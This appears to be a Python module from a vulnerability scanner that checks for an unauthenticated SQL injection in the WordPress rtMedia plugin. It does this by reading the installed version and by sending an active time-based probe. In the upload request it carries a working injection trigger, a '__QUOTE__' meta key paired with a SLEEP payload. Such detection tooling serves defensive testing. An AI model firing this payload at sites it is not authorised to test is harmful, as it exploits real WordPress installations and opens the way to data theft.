from __future__ import annotations

import base64
import json
import re
import time
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2026-128102"
NAME = "rtMedia unauthenticated SQL injection via custom_fields"
COMPONENT = "WordPress plugin rtMedia for WordPress, BuddyPress and bbPress"
AFFECTED_RULE = "rtMedia 3.7.33 through 4.7.17; fixed in 4.7.18"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
PLUGIN_SLUG = "buddypress-media"
UPLOAD_PAGES = ("/upload/", "/media/", "/")
NONCE_RE = re.compile(r'"rtmedia_upload_nonce":"([^"]+)"')
UPLOAD_URL_RE = re.compile(r'var rtMedia_plupload = .*?"url":"([^"]+)"', re.DOTALL)
PNG_BYTES = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Y9Zl1sAAAAASUVORK5CYII="
)


def _classify(version: str | None) -> str:
    if not version:
        return "DETECTED_VERSION_UNKNOWN"
    try:
        parts = tuple(int(part) for part in version.split(".")[:3])
    except ValueError:
        return "DETECTED_VERSION_UNKNOWN"
    if len(parts) < 3:
        parts = parts + (0,) * (3 - len(parts))
    return "LIKELY_VULNERABLE" if parts <= (4, 7, 17) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=_classify,
        remediation="Upgrade rtMedia to 4.7.18 or newer.",
        exploit_available=True,
    )


def _find_upload_page(client: HttpClient, base: str, timeout: int) -> tuple[str, str, str] | None:
    for path in UPLOAD_PAGES:
        page_url = f"{base}{path}"
        response = client.get(page_url, timeout=timeout)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        body = str(response.get("body") or "")
        nonce = NONCE_RE.search(body)
        if not nonce:
            continue
        upload_url = UPLOAD_URL_RE.search(body)
        endpoint = page_url.rstrip("/") + "/upload/"
        if upload_url:
            candidate = upload_url.group(1).replace("\\/", "/")
            if candidate.startswith("http"):
                endpoint = candidate
            else:
                endpoint = f"{base}/{candidate.lstrip('/')}"
        return page_url, endpoint, nonce.group(1)
    return None


def _upload(
    client: HttpClient,
    endpoint: str,
    page_url: str,
    nonce: str,
    key: str,
    value: str,
    timeout: int,
) -> tuple[float, dict[str, Any]]:
    fields = {
        "mode": "file_upload",
        "rtmedia_upload_nonce": nonce,
        "redirect": "no",
        "redirection": "false",
        "action": "wp_handle_upload",
        "_wp_http_referer": page_url,
        "context": "profile",
        "context_id": "0",
        f"custom_fields[{key}]": value,
    }
    files = {"rtmedia_file": ("proofcms.png", PNG_BYTES, "image/png")}
    start = time.perf_counter()
    response = client.post_multipart(endpoint, fields=fields, files=files, timeout=timeout)
    return time.perf_counter() - start, response


def _media_id(response: dict[str, Any]) -> str | None:
    try:
        payload = json.loads(str(response.get("body") or "{}"))
    except json.JSONDecodeError:
        return None
    if isinstance(payload, dict) and payload.get("media_id"):
        return str(payload["media_id"])
    return None


def run_timing_probe(
    target_url: str,
    delay: int = 1,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Upload a benign image and use the meta key __QUOTE__ trigger for SLEEP()."""
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    page = _find_upload_page(client, base, timeout)
    if not page:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=base,
            detail="No public rtMedia upload page publishing rtmedia_upload_nonce was found; the SQL timing probe was not sent.",
            action="Publish a page with [rtmedia_uploader allow_anonymous=true] and retry.",
        )
    page_url, endpoint, nonce = page
    request_timeout = max(timeout, delay + 5)
    baseline, baseline_response = _upload(
        client, endpoint, page_url, nonce, "proofcms", "marker", request_timeout
    )
    if is_transport_error(baseline_response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            detail=f"The baseline upload failed in transit ({transport_error_detail(baseline_response)}).",
            action="Retry when the target is reachable.",
        )
    if _media_id(baseline_response) is None:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            evidence={"page": page_url, "baseline_body": str(baseline_response.get("body") or "")[:200]},
            detail="The baseline upload did not return a media_id; the upload directory or anonymous-upload path is not available.",
            action="Make wp-content/uploads writable and publish the uploader with allow_anonymous=true.",
        )
    payload, payload_response = _upload(
        client,
        endpoint,
        page_url,
        nonce,
        "proofcms__QUOTE__",
        f", (SELECT SLEEP({delay})))-- -",
        request_timeout,
    )
    if is_transport_error(payload_response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            detail=f"The timing upload failed in transit ({transport_error_detail(payload_response)}).",
            action="Retry when the target is reachable.",
        )
    evidence = {
        "page": page_url,
        "endpoint": endpoint,
        "delay_seconds": delay,
        "baseline_seconds": round(baseline, 3),
        "payload_seconds": round(payload, 3),
        "baseline_media_id": _media_id(baseline_response),
        "payload_media_id": _media_id(payload_response),
    }
    if payload >= delay * 0.8 and (payload - baseline) >= delay * 0.6:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            evidence=evidence,
            detail=(
                f"The custom_fields meta key __QUOTE__ trigger moved the value out of its quote "
                f"and SLEEP({delay}) delayed the upload by {payload - baseline:.2f}s over the baseline. "
                "The probe is time-based and does not extract data."
            ),
            action="Upgrade rtMedia to 4.7.18 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="HIGH",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=endpoint,
        evidence=evidence,
        detail="The timing probe did not observe the expected delay; the build may be patched, cached, or filtered.",
        action="Confirm the installed rtMedia version and the upload nonce before retrying.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    result = run_timing_probe(target_url, delay=1, timeout=timeout, proxy=proxy)
    result.detail += " Safe mode uses a 1-second timing check; aggressive mode uses 3 seconds."
    return result


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    return run_timing_probe(target_url, delay=3, timeout=timeout, proxy=proxy)


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del cms_version, aggressive_command, aggressive_args, kwargs
    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        return run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    return run_safe_probe(target_url, timeout=timeout, proxy=proxy)


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> dict[str, Any]:
    del target_url, timeout, proxy, aggressive_args, aggressive_command
    return {"removed": [], "remaining": [], "manual": [], "detail": "The timing probe leaves uploaded media in the lab; reset the WordPress fixture."}


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["3.7.33-4.7.17"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-21",
        "updated": "2026-11-21",
        "required_detectors": [PLUGIN_SLUG],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-128102",
            "https://www.wordfence.com/threat-intel/vulnerabilities/id/f9ba24c0-90e1-4ea0-8e97-d1cfbbd2b7f8",
            "https://zeropath.com/blog/cve-2026-128102-rtmedia-unauthenticated-sql-injection",
            "https://wpsec.com/vuln/WPSEC-2026-3329/",
        ],
    }
